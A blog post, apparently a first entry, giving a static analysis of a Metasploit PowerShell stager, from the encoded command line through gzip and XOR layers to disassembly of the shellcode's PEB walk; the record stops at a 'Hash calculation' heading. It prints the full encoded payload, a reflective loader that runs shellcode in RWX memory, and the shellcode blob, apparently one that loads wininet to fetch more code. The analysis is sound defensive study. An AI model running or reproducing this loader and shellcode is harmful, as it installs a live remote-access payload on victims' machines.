# Static analysis of a Metasploit shellcode

For a first blogpost, I thought it'd be nice to analyze a common `Metasploit` shellcode - it's a great opportunity to discuss topics such as encoding, PEB, Windows shellcodes and Export Address Tables.

## Getting started
We start with an intercepted, long commandline:

```powershell
"powershell.exe" -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWABXADIALwBpAFMAQgBaACsARAByAC8AQwBEADUARQBBAFEAWQBpAE4AQwBZAEYAZQB0AFQAVAA0AGgAawAzAEEARQBHAHkAdQBtAFMAZwBxADcAQQBJAE0AdgB1AEIAeQBHAFQARABUAC8AZAAvAG4AMgBFAEEAbQB2AFoAMwBlAGIAVwBrAFgAeQBhAEsAcQBmAEsANwBmAHUAZABTAHgAZwBlAG0AZABRAFkAbABqADAAVgA1AGcAWQArAFoAdQBqAEUAbgBrAEIARAA1AFQAegBlAFYAdQBwAFUAQwBqAHoARgBmAG0AagAzAHgAdQBHAGYAcwBXAFQAWQAvAFQAeABkAHMASwAwADcAYwBkAEMAYQB3ADMAWgBOAHMARQBSAHgASAB6AFYAKwA1AG0AZwBBAGoAeQBtAE0ATAB0AEgAcABFADMATAA3AEIAagBGADUAZQBaAGIASgBNAFMAWQBqAHMAbQB1AEgAaAB6AGsANwB2AEoAagBtAEkALwBRAGsAdgA4ADUAaQBQAHEANwBQAEcAYgBoACsAawA2AHMAQwBOAFEAVgBIAGgAcAA3AFgAWgBTADQAQwBIAEgAZgAvADMAeQBSAFkAdwBKAHcAVAA0ADkANwB5AHQAdABUAEYAdABSAGgATAAyAEYANgArAEMAbwBVAEcAUwArAE0AWgBNADEASgB2AGkAdQB2ADkAaABnAGkAegBKAC8ATQBiAGQAdgBsAGIAWQBiAEwASgBCADcASQBVAHQARQBaAEsAMwBCAG8AWgBaAHYAcAArACsANgBnAFkAVgBTAEQAeQByAEcAegBuAFYAbwBJAGYALwBuAG4ALwBuAGkAeQB4ADMAMwBXAHAASABEAEcATABsAFIASQBXADgAawBFAGMAVgBlAHgAWABiAGQAZgBKAEgANQBYAGsAdwBWAG0AcwBrAE8ARgAvAEkAOQB4AHkASgBCAEYAQwB4AHAAWgBlAEwANABmAEwAVQB5AHkAcQB6AFgATQArAE4ANwBaADkAdgB6AHgAWQB0AG4AcQB4ADAAQwBQADMANwB0AFoAQwByADEAegBGAFAASQB3ADMASQBBADIATABUAE8ARwBPAGIATAB6AEUAdQBxADcAKwBYADEAbABmAG4AagAzAFoAcABoADcARgBQAEgAdwB4AFgATgBwADUAZwBFAE8AdwBPAFQAdgBXAFAAaABxAEsASQBpADMAMwBiAHgARQBDACsAQgBMAFIAOQBCACsAUAB4AFYAdgBnAGgARwBFAEUAeABqADQAagBOAFgAVwA0AEIAdgBIADIAeAB4ADQAZABhAFAAWABiAGMATQBjAGwAOQArAFYAKwA1AHIAUQBjAGUASABLADcAaQAvAHkAMQBUADQAeQBBAFIAVQBBADAAcQBLADUAVQB0AE8ALwBBADQAYwB2AFMAeAB2AHoAdQBMAEEAbgBaACsAcwAvADUAQgBjAFIAZgBqADkAbABHAEQARgAzAFAAZgBjAEoANgBsAHEAWQB4AGUAdgBFAE0AVgB2AEYAUABEADkAawBLAHUANQBtADUAdQBYAGIASQBuAEIAbgA4AEkAZwBpAEoAeQBNADcAeQB2AEQAbABwAGsAZQBHAEkARgBvAFEASgBJADAAbgBDAGEASgBjAGYASAAxAG4ALwBpAGMAMQBWADQANQBvAC8ASQB2AEIAWABGAFgAcgBnAHYAUABPAFQAeABuAE8ANwA0AHkATAArAFAAQQBzAFYAOQB6AE4AOABYAGMASgBYAHYAUwA4ADcAZABGADcATABnADIASgB1AG4ANwBYADEAZQBEAGgASgBlAE8AagA2AFgARQBSADUANQBqAFgAUgBPACsAOABGAG4ATQA4AE4ATABGAEcAUgA2AFYASwA1AGsATwBkAGgAYgB5AGwAeABmAFkAbABpADcAbwA1AEYATgBBAFgAMwA1AG0AawB6ADIASAB2AHYATQBLAFoAKwBOAGEARgBzAFEAOQBBAHEAcwBnAEoAWQBvAC8ARwBuAE8ATwBZAFMARwB2ACsAVAAzAHMAQQBYADcAbgBQAGEAVABwADcAUgBMAEsARABGACsAcABMADYAVwBWAFgATABXAG4AKwB6AFMAWABSAFIAZABGAFUAWgBrAFoAeABGAEQAbgBWAHAAawB4AE0ASABLAHgAWABXAFoAYQBmAHUAUgBjAFgAcgBWAGkARwBtAFQATAAvAEQALwBtADkAbQBLAFgATwBoAGEASwA2AEYAWABjAGEALwBFAFQAUwBDACsAcQB4AGMAQwBIAGkAbwBrAHQAaQBDADcAQQBZAEIAbwA3AGIARABuAEkAVABWAEUAcABNADYAcABqAFkAeQBFAHgAbgBOAFgAVgBoAFAAeQBuAG0ASQBqAEkAZABhAEgAawBRAE4ASQBlAFkAZwBJAG4ASwBSAFkARwBUAFgATwBHADIATwBWAC8AegA0ADkAaQB4AGMAQgBVADgAMwBZAHUAOQBvAEEANgA2ADAASwBLAGkAMQBiAFEAYwB5ADQAVgBsAGEAVQBiAFcAbQBFADcALwB4AC8ATQB2AHQAYgBKAHUAUwBoAFMAcgBLADQAZwBmAFQAQQBhAEUAcwBCAHcAQQAxAHAAbQB4AGcANgBoADAATgBmAHkANQBaADgAUwA3ADMAOAB6ADcAOABjAFcAOAA0AE8AWgBJAHMARwBYAFEAQgBhAHkAUQBuAHcAUgBFAHAAcQBXAFMAMABaAHAAcABaAGYATAAxADMAYwBzAE0AKwBRAEkAQgBkAFEAVQBFAG4AZwBDAGkAbgBDADkAWgBtAFIAdAByAEoARABuAEcAMwBHAG8ASgBiADMATgBjADUAMgAwADUAYgAyAGkAaABxAHAAcwB3AHIATwBIAGgAdwA4AFYAdQBkAHYAdABEAEgAZgBDAHMARwB2AEoAYwBYACsAZwBzAHAAMgBsADkAdAB5AFEAYQB2AEUAaAAxAG0ASgBUAFkASABtAEYAQgBiAHAAVAAyAEoAYQBYADIAcgA0AGYAegBMAGoAWQBxADMASAAyAFQAdAB2AHIAYwBCAFkAOQBoAG0AbwBrAGEAWAB1AHAAcABWAGIARABRAEsAbQB2AG4ATwBaAEYAegBwAG4ALwBlAFgASABnAEYAbABOAE4AZQBWAHkAMABsAFoAbwA2AGoAcABTAFUAWAB0AFgAMgBnAGgASwBLAHoAUQBEAFcAOQA5AHAAZQBEAEQAcgBBADEANgBqAHYAZgBPAEYAZwAxADcARABjAHEAZQBOAHAAMQB6AHIAdwB0AEkASABSADYAcABnADgAagBVAHMARwB5ADcAWABIAGkAZAA0AGQAeQB6AHYAZAA4AE8AMwB1AGcAbgB0AFcATwB2AHEAcABtAG8AQgBQADQASgBmAEIAcQAwAFAAVwBoAHMAYwA0AHUAdAB3AGsATQBLADEAbQBGAEsAcQBwAHYAMQBqAG8AaABwAGIAZgA2AFcAaABxAEoAegBFAGUAVgBvADYAVwA2AEEAZQBMAHAAVwB4AEkAVABpADQALwBtAEoAKwBTAHMAQQBIADgAZQBnADAAdwBPAFIAcABKAGIAMQBpAHIAMgAwAGQAcgBxAGgAeQBzAHEAZAA1AE4AMQBKAG4AZQBCAGgAMQBoAFAARgBuAFYAVgBMADAAYgBIAEYAcwBiAHIAVQA0AGsAdwA3AEIAUABoAG4AbgBrAEQARwA3AHUANwB0AEgAVQBhAHYAcQBIAFQATAA5AGgASAB3AC8AMgBLAE8AcAAzAFQARAByAGoAQgA4AGkAcgBKAFkAbABmAE4ANwBTAE4AZAB1AHgAYQBPAHoAcQBlAGQAdQBvAEUASgBlAEsAdQA2ACsAQwBGAHMASwBTAHAAMwBFADUAMwB2AHUAbwAwAFoAVgBqAEwAOQBNAGcAYQB4AGoAQwB4AFEAYQArAHIAbQB0AEkAVAA2AFAAWABGAFgAZwA5ADgAUQBBAC8ASwBiAEkAdgA1AHcAZABOAEUAUAAxAG0AOAAwAEwAVQBTAG8AbwBFAGYAZwA2AGUANgBBADcASQBiAHQATQBmAEQAdQBhAFIAMgBUAE8AegBKAG0ALwBWAGsAdwBYAGIAdgA1ADQANwBxAGoAbwBWAG8ANQBVADMAQgAxAHIAMwBDAEMAcQBqAFoAZgA4AFMAcwBsAGcAagBTAGIATwA2AGIAcABjADcAagBWAGoAZQA1AFcAVwAwAHAAegBzAGEAVwA0AE8AcwB6AGkAUwBUAHgANQBtAEIAVwBSADgAWQB6AEkAYQBFADQAOAA1AHQAMgBTAFYAcgAzAEgAUABOAFEANQBZAGoAcwBEAFoAUwBxAFcATABJADIAVQBwADgAZgBpAEgAcAAxAEoATQArAEgAawB0AGUAUgBoADEAdAB1ADIAbgA3AFcAWQAyAE0AcgBEAEUAMQBGADYAQQAzAEgAVgBuACsAbQBLAEcAagBFADIAYgAyAFoAcgA0AGUAUwBNAE4ASgBsAHAANwBiAFQANgBqAFMAYQArAEYANQBIADIAbABSAFgAdwBpAEgAdwB4AEoAcABMAEgAKwBlAGMAZABQAEsAawBSAGYAdQBoAFcAVwBWADcALwB0AHAAQgBhAHUAZwAxAGgAdwB2AFAAVgA3AGwAQgBzAGcANwBrAGIAYgBjACsAbgBvAHgASABiAHQAUwBVADEAcAB6AFgAdQBwAGYAbABoAGoAbwBYAEoAcQB2ADcASgBoAEcATgBoAEgAOABvAEwAVgBsAFIAbwBNAE8ASgB2AHkARwBHAGYASQBqAHEALwBuAHIAZQBxADYARgBtAGoAVABYAEcATQBlAEkAZQAyAGcAbwBWAGsAMQBEAFgANQB1AHQAawBMAFkALwBOAG0AUwBWAHQAYQBKAHUAcQA0ADYAUABxAEsAZQB6AGoAWQB5AGYAdQBxAEUASQBzADkAMABmAG0ASwB2AFQAawBiAGQAUQBZADcATABnAGgASwBkAFUANAAzADYAYgByAEoARQBtAFEAZABOAFQAWAB6ADkAUABKAG8AZQBGADEAVABuAFMARABxADAATABvADAAdABPAGoATQA5AHoAegBoAHQAdAByAGoAWQBpADQAdgBQAGMAcwBQAGgAUwByADcAUAAzADgAaABIAGgAVQBHAGsAcwBQAC8AaQBDAHUARwByAHYAVgBZAC8AMQBBAEoAeQAyADcAcABEAHkATAA5AG0ASABRADMAMQBDAEwANAAwAHYAeAAwAFQAUwBmAFAAZgBYAG8AMQBMAGYAVgBKAHYAZgBVADUATQBtADQAMABWAEkAcwBhAGIASwB4AEEAOQBPAGYAaQBOADYAdwB0AFYAWgB4AEQARABuADEANQBGAEUAYQBTAGEAZgBsAGcAbgBpAG8AUABtAG4AYwBEADQAUgBHAGUAMwAyAGEASgB0AHUAQgB5AGIAdAAwAC8AUABRAFEAYwBIADEALwBLAFoAcwBMAGQAcgBpADQAZAB6AHEAQgBGAEEAbAB6AGIAVwBNADAAKwA1AFAAVgBGAEgASgB4ADYAMgA0AGcAagAwACsAUQAwADEAMQA0AE4AaABvAC8ANwBPAEsAYQBmAFQAaABDAGoAawBXAGQASQBLADIAVgBqAGIAYgBmAEoAZABZAFQAawBXADAANQAyAHIAUgBnAGIANgBuAGoAYgBtADgAeABDAFEALwAyAHEAYgBxAEwAOQBlAGsARABXAG0AMgAxAFcASQBRAGEAWAA3AFIAeABTAGUAcQBHADkATgBIAGkAWgBUAG8AWgBiAGUAZABQADUAcQBpAGwAUAA4AHYASAB2AHMAWQAvACsAUAB5ADIAOQBqAFgAdABYAHMAdQBBAHcARAB4AHkAVABPAC8ANABmAHoASAB3AGYAKwBkAFMANQByADAALwBRAFYAZQBDAGgAcABlAGUAbAAwAHIARgBkAEUANQA0AGYALwBOAHkAZQAzAHkAOQB6AG4AWAB2ACsANwB2AEYARQBhAFQAeABEADIAbQB2AHkAOQA3AHMAMABZAGMATwA5ADYAdABoAHEAWQBkAEkAdABFAFkAdQBkAEQANABZAGUASwA3AFgAbABSAEkAUQA1AFQASwAyAEQAQQBJAG4ANQBTAGcAVQBQAHAAKwAwAHQANQBqADQAMgBJAFUAcABGAE8AYgBVAGEANQBOAHYAdQBXADUAZwBwAFkAUABXAEwAeQBZAGUARwBQAHYATwB3ADkAZwByAFgARwBZAGoAVwBQAEwAVgBUADEAZABGADUAcAAwAFEAcABxAHUAegBUADQAdAA0AHUAYwB5AEcAawBZAHUASAAxADUAbgBzAFMAdgBqAGwAeQB4AHoAYwBLADMAOABBAHMAWQB2ADkARgBWADIAWABHAGYAYgBJAHMAeQB5AGIALwB0AGYAWQBZAHUANwAzAFkAUgBHAEQAWABWAEoANABGADEAZABPAGgANwBFAFAAbABuAHoAVQA1AEcAYQBhAGkAaABmADAAUwBlAHgANwArAFAAOABZAGcAQgArAFUALwBuAGQAbwBVAC8AQwB5AGUAZQA0AGQAdQBzAHkAZwB6AC8ARQBxADUAdgBKAC8ANQBIAEwAYQBrAHYAbAB3AEgAagBrAG4AKwBGAHIAQgBJAGQAUABJAGMAaQArAGkAaQBOAEMANwBUAGIAQwBBAFQANQB2AHMAcgBpADcAYwBvAGkASwBqAHkAVgBQAG0ARgBqAEgAZgBtAFQAdAB3AHIAeABYAHgAVgBmAGkAKwBJAGEAcwA0AHYAYgBpAFoAOAArAGYAYQBOACsAYQBBAG4ARABQAGoATgAyAGEASQBMAFEAegBqADkAbAAwAG4AVwBFAEMAVwBZAHAAaQAvAFUAdABHAFoAawBKAFEAWQB6AHYANABHAHMAegBBAEwASgB2ADgATgBBAEEAQQA9ACIAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA
```

This is a PowerShell [base64](https://en.wikipedia.org/wiki/Base64) encoded commandline (indicated by the `-encodedcommand` flag). When decoding, it looks like this:
```powershell
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("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"));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

This payload performs yet another `base64` decoding (of the part that starts with "H4sIA...") and saves it into a memory stream ($s).
Then it treats it as a compressed (`gzip`) stream, decompresses it and executes the content (with `IEX`).
It's quite easy to decompress it - you can use PowerShell, [CyberChef](https://gchq.github.io/CyberChef/) or even Python:

```python
import io, gzip, base64
x=b'H4sIAAAAAAAAAK1...' # Omitted
print(gzip.GzipFile(fileobj=io.BytesIO(base64.b64decode(x[:]))).read().decode())
```

The output contains more PowerShell commands, this time with more complex logic:

```powershell
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
        Param ($var_module, $var_procedure)
        $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
        return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
                [Parameter(Position = 1)] [Type] $var_return_type = [Void]
        )

        $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
        $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

        return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDHJTemEjhWb0L/ZiHlVBsgmXSSdvF0Ba9O7e0IyBDYZnT+J7kNT1Y4fCYVcBnNYDryujwT2USQrrqCYn9d+DhMiTw21rEmPF2C+cjDO3PCN2UEZRDmJERk1XGQNuSkBRTFBMRVcOYFFaU1dMYnNqDBUNEi4pI6tsWnmJDj2gBwomC4lt7Z1DzmDbG5920MnhiaHqm9RbmnH1PyhoEkL6VWVUls9Dh1mA/EE8HZBWg/9rCSy35+f0CBtRWnjrSEws6nhZM4a940SVua15GFtCyqNIZhyhEVTYcDjtGtHVxHmF077JuJHBuEOUTgqmEks8Pp1Rr+41ndthyyyaDxNhQXWw8mJztje2Bqltz7iRv3SlMAUrCf/mc3qC20/Zza3a+VD5nPu2Spg76wtWAd+FQCdwPOjtc13+uxTTQmHxi6k291K93rV8AFcDWjdoTnWCmRAhHeu1S1KmttsDzfbrma6W8/PB8GhzXykPT3ltVK5o1OnfETb0Rb/iJoDsBZIjS9OWgXXc9kljSyMzIyNLIyNjI3RLe4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bGe+DLqt7c3EtWUkZKTUANQExOI35n3k4=')

for ($x = 0; $x -lt $var_code.Count; $x++) {
        $var_code[$x] = $var_code[$x] -bxor 35
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
        start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
        IEX $DoIt
}
```

Let's break it down:
- The `$DoIt` variable contains most of the logic. It defines a function called `func_get_proc_address` that is just a wrapper to `kernel32!GetProcAddress`, and uses the `func_get_delegate_type` function to get a reflective delegate.
- The `$var_code` variable is yet another (!) `base64` payload, but this time it's less obvious - trying to decode it naively yields garbage.
- The `$var_code` variable is XOR-ed byte by byte with the value 35. This already explains why decoding it yields no strings, but even after XORing - it still doesn't look promising without the right context.
- The next couple of lines allocate a buffer with the [kernel32!VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) function. It is invoked to allocate a buffer (saved in `$var_buffer`) with `flAllocationType=0x3000` and `flProtect=0x40`. Looking at [MSDN](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) reveals that the allocation type is `MEM_COMMIT | MEM_RESERVE` and the page protection is `PAGE_EXECUTEREADWRITE`.
- The payload at `$var_code` (which was `base64`-decoded and XORed with the constant 35) is copied to the buffer and then executed (done with the `$var_runme` delegate).
- Note the last part of the code - it checks if the pointer size is 8. If it is (i.e., 64-bit process) it'll run as new 32-bit job. Otherwise, it simply executes `$DoIt`.

That tells us that the base64-encoded payload should be treated as a 32-bit [shellcode](https://en.wikipedia.org/wiki/Shellcode).
Let us analyze it statically again by XORing it and writing it to a binary file:

```python
import base64
x=b'38uqIyMjQ6rGEvFHqHE...' # Omitted
open(r'/tmp/payload.bin', 'wb').write(bytes([ i^35 for i in base64.b64decode(x) ]))
```

This is where the fun begins. You can use your favorite disassembler (IDA, Binary Ninja, etc.).
There are even some great [online disassemblers](https://shell-storm.org/online/Online-Assembler-and-Disassembler) at your disposal if you don't care about opsec.
The start of the shellcode is at offet 0 and the code should be treated as X86 code.

## Walking the PEB
The code starts with a CALL instruction:

```assembly
0x0000000000000000:  FC                         cld        
0x0000000000000001:  E8 89 00 00 00             call       0x8f
```

The `cld` instruction clears the direction flag (so string operations such as `movsb` move forward and not backward), and then performs a relative call to 0x8f.
Since `call` pushes the next instruction to the stack, we remember that the stack was pushed with the address that is at offset 6 in the shellcode.
Let us examine the code at offset 0x8f:

```assembly
0x000000000000008f:  5D                         pop        ebp
0x0000000000000090:  68 6E 65 74 00             push       0x74656e
0x0000000000000095:  68 77 69 6E 69             push       0x696e6977
0x000000000000009a:  54                         push       esp
0x000000000000009b:  68 4C 77 26 07             push       0x726774c
0x00000000000000a0:  FF D5                      call       ebp
```

Immidiately using a `pop` to save the address is a common shellcoding trick (`call-pop` sequence).
The next pushes are interesting - on the surface they seem like odd constants, but decoding them as ANSI strings reveals something interesting:

```python
import struct
struct.pack('<LL', 0x696e6977, 0x74656e)
```

Since we're looking at stack pushes - I had to extract them at the opposite order, and make sure I use `Little Endian` (that's the `<` symbol in the code).
This prints out `b'wininet\x00'`, which is a name of a Windows DLL used for Internet communications.
Note that `push esp` will push the address of the top of the stack, which is a nice way of getting a pointer to the `wininet` NUL-terminated string.
Moving on, we push another constant (0x726774c) - this one does not decode to anything meaningful, and call `ebp`. Remember that `ebp` points to a piece of code at offset 6 from the beginning of the shellcode, so let us examine that part!

The code at offset 6 starts with a few interesting instructions:
```assembly
0x0000000000000006:  60                         pushal     
0x0000000000000007:  89 E5                      mov        ebp, esp
0x0000000000000009:  31 D2                      xor        edx, edx
0x000000000000000b:  64 8B 52 30                mov        edx, dword ptr fs:[edx + 0x30]
0x000000000000000f:  8B 52 0C                   mov        edx, dword ptr [edx + 0xc]
0x0000000000000012:  8B 52 14                   mov        edx, dword ptr [edx + 0x14]
0x0000000000000015:  8B 72 28                   mov        esi, dword ptr [edx + 0x28]
0x0000000000000018:  0F B7 4A 26                movzx      ecx, word ptr [edx + 0x26]
```

After a simple prologue (pushing all the registers and creating a new stack frame), we see `edx` is nullified (by self-XORing).
Then, `edx` gets the address of `fs:[0x30]`. This address is the [Process Environment Block (PEB)](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb).
The PEB is a block in usermode that contains useful data from the process to use, including its commandline, debugging status, loaded modules and others. It's a performance enhancement to avoid unnecessary kernel syscalls.
We see several addresses being referenced - in IDA you could load the PEB structure, but just for the sake of completeness:
- Offset 0xc is the `LDR` member of the `PEB`, which has a type of `PPEB_LDR_DATA`, which is documented [here](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data).
- Offset 0x14` in the `PEB_LDR_DATA` structure is the `InMemoryOrderModuleList` member, of type `LIST_ENTRY`. The `LIST_ENTRY` structure is used extensively in Windows, an is usually just a header in a larger structure. This case is no exception - the real type of the entries is `LDR_DATA_TABLE_ENTRY`.
- At offset 0x24 in the `LDR_DATA_TABLE_ENTRY` there exists a member FullDllName of type `UNICODE_STRING`. That type is used extensively in Windows, and is essentially a container for a Pascal-string - first two WORDs describe the length of the string and its buffer capacity. Therefore, at 0x28 we will bind the actual buffer - which will be saved in the `esi` register.
- The `ecx` register is just 2 bytes before the DLL name buffer - and contains the length of the string.

To summarize, this entire chunk fetches the `FullDllName` in the current PEB module entry - saving the buffer in `esi` and its length in `ecx`.

## Hash calculation
Let us examine the next couple of instructions:

